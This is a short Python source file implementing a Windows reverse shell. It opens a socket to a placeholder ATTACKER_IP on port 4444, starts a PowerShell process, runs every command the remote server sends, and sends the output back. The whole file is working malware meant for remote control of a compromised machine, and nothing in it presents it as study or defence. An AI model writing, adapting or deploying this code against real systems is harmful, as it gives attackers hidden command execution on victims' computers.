import socket
import threading
import subprocess
import time

ATTACKER_IP = "x"
def powershell_handler(connection):
    # creating da powershell instance
    powershell_instance = subprocess.Popen(
        ["powershell.exe", "-NoLogo", "-NoProfile"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        shell=True,
        text=True
    )
    

    buffer = []

    # helper to read ps stdoutput
    def read():
        while True:
            try:
                line = powershell_instance.stdout.readline()
                if not line:
                    break
                buffer.append(line)
            except:
                break

    # multi-threading to allow stdout reading to run while other functions are running
    threading.Thread(target=read).start()

    while True:
        try:

            # recieve the command from server
            command = connection.recv(1024).decode().strip()
            if command.lower() == "exit":
                powershell_instance.kill()
                break

            # write the command to ps instance
            powershell_instance.stdin.write(command + "\n")
            powershell_instance.stdin.flush()
            time.sleep(0.5)

            # send back result of the command
            output = ''.join(buffer)
            buffer.clear()
            connection.send(output.encode())
        except:
            break

def establish_connection():
    try:
        caller = socket.socket()
        print('connected!!')
        caller.connect((ATTACKER_IP, 4444))
        print('connected!')
        powershell_handler(caller)
    except Exception as e :
        print(e)
        time.sleep(5)


establish_connection()
